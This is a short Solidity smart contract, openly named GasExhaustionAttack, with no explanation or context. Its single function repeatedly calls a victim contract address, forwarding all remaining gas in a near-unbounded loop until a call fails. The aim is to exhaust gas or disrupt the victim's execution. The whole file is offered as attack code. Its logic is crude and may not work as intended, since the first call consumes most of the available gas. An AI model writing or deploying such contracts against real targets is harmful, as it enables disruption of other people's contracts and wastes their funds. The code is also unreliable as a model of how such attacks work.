pragma solidity ^0.8.21;

contract GasExhaustionAttack {
    function interruptExecution(address victim) external {
        for (uint256 i = 0; i < type(uint256).max; i++) {
            (bool success,) = victim.call{gas: gasleft()}("");
            if (!success) break;
        }
    }
}
